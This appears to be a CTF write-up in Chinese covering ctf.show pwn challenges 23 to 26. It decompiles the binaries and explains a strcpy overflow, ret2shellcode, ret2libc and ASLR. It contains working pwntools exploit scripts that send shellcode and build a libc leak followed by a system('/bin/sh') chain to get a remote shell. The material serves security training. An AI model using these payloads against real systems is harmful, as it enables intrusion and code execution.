<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __gid_t v3<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [esp-Ch] [ebp-2Ch]</span>
  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [esp-8h] [ebp-28h]</span>
  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp-4h] [ebp-24h]</span>
  FILE <span class="token operator">*</span>stream<span class="token punctuation">;</span> <span class="token comment">// [esp+4h] [ebp-1Ch]</span>

  stream <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/ctfshow_flag"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_8048904<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>stream <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"/ctfshow_flag: No such file or directory."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">fgets</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">signal</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__sighandler_t<span class="token punctuation">)</span>sigsegv_handler<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setresgid</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v5<span class="token punctuation">,</span> v6<span class="token punctuation">,</span> v7<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_8048940<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_80489B4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_8048A30<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_8048ABC<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_8048B4C<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_8048BD0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_8048C64<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_8048D28<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Type  : Linux_Security_Mechanisms                               "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Site  : https://ctf.show/                                       "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Hint  : No canary found                                         "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"How to input ?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> argc <span class="token operator">></span> <span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>1.首先，程序尝试打开名为”&#x2F;ctfshow_flag”的文件，并将文件指针赋值给 stream 变量。如果打开文件失败（文件不存在或无法访问），程序输出错误消息并终止。</p>
<p>2.如果成功打开文件，程序使用 fgets 函数从文件中读取最多64个字符到名为 flag 的缓冲区。</p>
<p>3.程序输出提示消息：”How to input ?”</p>
<p>4.如果程序运行时传入了命令行参数（ argc 大于1），则调用 ctfshow 函数，并将第一个命令行参数作为参数传递给该函数。</p>
<p>跟进ctfshow函数</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>__cdecl <span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>src<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> dest<span class="token punctuation">;</span> <span class="token comment">// [esp+Ah] [ebp-3Eh]</span>

  <span class="token keyword">return</span> <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dest<span class="token punctuation">,</span> src<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>5.ctfshow 函数很简单，它接受一个字符串参数 src ，并使用 strcpy 函数将该字符串复制到名为 dest 的缓冲区中。然后，它返回指向 dest 缓冲区的指针。</p>
<p>ctfshow函数用到了strcpy()函数，而这个函数是可以发生溢出的！并且src就是我们输入的参数，使我们可控的，并且他没有被限制长度，代表我们可以利用溢出漏洞！</p>
<p>参数足够长溢出之后即可getFlag</p>
<p><img src="pwn23.png" loading="lazy"></p>
<h4 id="pwn24-ret2shellcode"><a href="#pwn24-ret2shellcode" class="headerlink" title="pwn24(ret2shellcode)"></a>pwn24(ret2shellcode)</h4><p>你可以使用pwntools的shellcraft模块来进行攻击</p>
<p><img src="pwn24_checksec.png" loading="lazy"></p>
<p>IDA 32位 仅部分开启RELRO保护  存在一个RWX权限的段，即可读可写可执行的段</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_80486E0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_8048754<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_80487D0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_804885C<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_80488EC<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_8048970<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_8048A04<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_8048AC8<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Type  : Linux_Security_Mechanisms                               "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Site  : https://ctf.show/                                       "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Hint  : NX disabled &amp; Has RWX segments                          "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argc<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>反编译没法跟进ctfshow</p>
<pre class="language-assembly" data-language="assembly"><code class="language-assembly">.text:080484C6                 public ctfshow
.text:080484C6 ctfshow         proc near               ; CODE XREF: main+132↓p
.text:080484C6
.text:080484C6 buf             &#x3D; byte ptr -88h
.text:080484C6 var_4           &#x3D; dword ptr -4
.text:080484C6
.text:080484C6 ; __unwind &#123;
.text:080484C6                 push    ebp
.text:080484C7                 mov     ebp, esp
.text:080484C9                 push    ebx
.text:080484CA                 sub     esp, 84h
.text:080484D0                 call    __x86_get_pc_thunk_bx
.text:080484D5                 add     ebx, 1B2Bh
.text:080484DB                 sub     esp, 4
.text:080484DE                 push    100h            ; nbytes
.text:080484E3                 lea     eax, [ebp+buf]
.text:080484E9                 push    eax             ; buf
.text:080484EA                 push    0               ; fd
.text:080484EC                 call    _read           ; 调用read函数 将我们写入的读进去
.text:080484F1                 add     esp, 10h
.text:080484F4                 sub     esp, 0Ch
.text:080484F7                 lea     eax, [ebp+buf]  ; 将我们输入赋给eax的[ebp+buf]
.text:080484FD                 push    eax             ; s
.text:080484FE                 call    _puts		   					
.text:08048503                 add     esp, 10h
.text:08048506                 lea     eax, [ebp+buf]
.text:0804850C                 call    eax             ; 执行读入的内容
.text:0804850E                 nop
.text:0804850F                 mov     ebx, [ebp+var_4]
.text:08048512                 leave
.text:08048513                 retn
.text:08048513 ; &#125; &#x2F;&#x2F; starts at 80484C6
.text:08048513 ctfshow         endp</code></pre>

<p>pwn文件的NX是关掉的，代表栈可执行。</p>
<p>而开始我们将栈中地址ebp-0x88赋给eax，并在该地址里写入我们输入的东西，最后程序会执行这里边的东西，也就是会执行我们写入的东西，如果我们写入的是shellcode，那么程序也就会执行我们的shellcode！</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'pwn.challenge.ctf.show'</span><span class="token punctuation">,</span> <span class="token number">28127</span><span class="token punctuation">)</span>
<span class="token comment"># io = process('./../Challenge/ctfshow_pwn/pwn24')</span>
shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>

<h4 id="pwn25-ret2libc"><a href="#pwn25-ret2libc" class="headerlink" title="pwn25(ret2libc)"></a>pwn25(ret2libc)</h4><p>开启NX保护，或许可以试试ret2libc</p>
<p><img src="pwn25_checksec.png" loading="lazy"></p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">logo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Hello CTFshow!\n"</span><span class="token punctuation">,</span> <span class="token number">0xEu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ctfshow</span></span>
<span class="token class-name">ssize_t</span> <span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-88h]</span>

  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>通过ctfshow()函数，读入我们输入的字符串，注意看大家，读入的buf是132个长度，而read()函数限制我们读入的长度位0x100，也就是256个长度。代表肯定会溢出，这个地方就是利用点。</p>
<p>具体攻击手法为：<strong>ret2libc</strong></p>
<p>即先找到栈溢出漏洞，通过write函数泄露 write 函数的真实地址，根据泄露的 write 函数地址，使用 LibcSearcher 来搜索 libc 库中相应的函数地址和字符串地址，获取 system 函数和”&#x2F;bin&#x2F;sh” 字符串的地址。构造新的 payload，使用泄露的 system 函数和 “&#x2F;bin&#x2F;sh” 字符串的地址来进行get shell</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'pwn.challenge.ctf.show'</span><span class="token punctuation">,</span> <span class="token number">28288</span><span class="token punctuation">)</span>
<span class="token comment">#io = process('./../Challenge/ctfshow_pwn/pwn25')</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./../Challenge/ctfshow_pwn/pwn25'</span><span class="token punctuation">)</span>

offset <span class="token operator">=</span> <span class="token number">0x88</span><span class="token operator">+</span><span class="token number">0x4</span>  <span class="token comment"># read_buf</span>
main <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>
puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
payload <span class="token operator">=</span> cyclic<span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span> puts_addr<span class="token punctuation">)</span>

libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>
system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
bin_sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> cyclic<span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span>cyclic<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>

<h4 id="pwn26-ASLR"><a href="#pwn26-ASLR" class="headerlink" title="pwn26(ASLR)"></a>pwn26(ASLR)</h4><p><img src="pwn26_checksec.png" loading="lazy"></p>
<p><strong>ASLR</strong>（Address Space Layout Randomization）是一种操作系统级别的安全保护机制，旨在增加软件系统的安全性。它通过随机化程序在内存中的布局，使得攻击者难以准确地确定关键代码和数据的位置，从而增加了利用软件漏洞进行攻击的难度。</p>
<p>开启不同等级会有不同的效果：</p>
<ol>
<li>内存布局随机化： ASLR的主要目标是随机化程序的内存布局。在传统的内存布局中，不同的库和模块通常会在固定的内存位置上加载，攻击者可以利用这种可预测性来定位和利用漏洞。ASLR通过随机化这些模块的加载地址，使得攻击者无法准确地确定内存中的关键数据结构和代码的位置。</li>
<li>地址空间范围的随机化： ASLR还会随机化进程的地址空间范围。在传统的地址空间中，栈、堆、代码段和数据段通常会被分配到固定的地址范围中。ASLR会随机选择地址空间的起始位置和大小，从而使得这些重要的内存区域在每次运行时都有不同的位置。</li>
<li>随机偏移量： ASLR会引入随机偏移量，将程序和模块在内存中的相对位置随机化。这意味着每个模块的实际地址是相对于一个随机基址偏移的，而不是绝对地址。攻击者需要在运行时发现这些偏移量，才能准确地定位和利用漏洞。</li>
<li>堆和栈随机化： ASLR也会对堆和栈进行随机化。堆随机化会在每次分配内存时选择不同的起始地址，使得攻击者无法准确地预测堆上对象的位置。栈随机化会随机选择栈帧的起始位置，使得攻击者无法轻易地覆盖返回地址或控制程序流程。</li>
</ol>
<p>在Linux中，ALSR的全局配置&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space有三种情况：</p>
<p>0表示关闭ALSR </p>
<p>1表示部分开启（将mmap的基址、stack和vdso页面随机化） </p>
<p>2表示完全开启</p>
<table>
<thead>
<tr>
<th align="center">ALSR</th>
<th align="center">Executable</th>
<th align="center">PLT</th>
<th align="center">Heap</th>
<th align="center">Stack</th>
<th align="center">Shared libraies</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0</td>
<td align="center">×</td>
<td align="center">×</td>
<td align="center">×</td>
<td align="center">×</td>
<td align="center">×</td>
</tr>
<tr>
<td align="center">1</td>
<td align="center">×</td>
<td align="center">×</td>
<td align="center">×</td>
<td align="center">√</td>
<td align="center">√</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">×</td>
<td align="center">×</td>
<td align="center">√</td>
<td align="center">√</td>
<td align="center">√</td>
</tr>
<tr>
<td align="center">2+PIE</td>
<td align="center">√</td>
<td align="center">√</td>
<td align="center">√</td>
<td align="center">√</td>
<td align="center">√</td>
</tr>
</tbody></table>
<p>直接运行</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">Here is your ASLR level:
<span class="token number">2</span>
If the result is <span class="token number">0</span>, <span class="token keyword">then</span> you get the correct flag<span class="token operator">!</span>
If not,you will get a fake flag<span class="token operator">!</span>
flag is :ctfshow<span class="token punctuation">&#123;</span>0x400687_0x400560_0x1df12a0_0x7d97260e3680<span class="token punctuation">&#125;</span>
</code></pre>

<p>打开IDA看一下</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span> <span class="token comment">// ST00_8</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment">// ST08_8</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment">// ST00_8</span>

  ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v4 <span class="token operator">=</span> <span class="token function">dlopen</span><span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">,</span> <span class="token number">258</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_4008F0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_400970<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_400A00<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_400A90<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_400B18<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_400BB0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>aClassifyCtfsho<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Type  : Linux_Security_Mechanisms                               "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Site  : https://ctf.show/                                       "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Hint  : Please confirm your ASLR level first !                  "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Here is your ASLR level:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat /proc/sys/kernel/randomize_va_space"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"If the result is 0, then you get the correct flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"If not,you will get a fake flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"flag is :ctfshow&#123;%p"</span><span class="token punctuation">,</span> main<span class="token punctuation">,</span> ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"_%p"</span><span class="token punctuation">,</span> system<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"_%p"</span><span class="token punctuation">,</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"_%p"</span><span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">free</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>发现会打开<code>/proc/sys/kernel/randomize_va_space</code> 所以只需要把他值改为0即可 因为这里没有使用提供的虚拟机环境 所以flag不对</p>
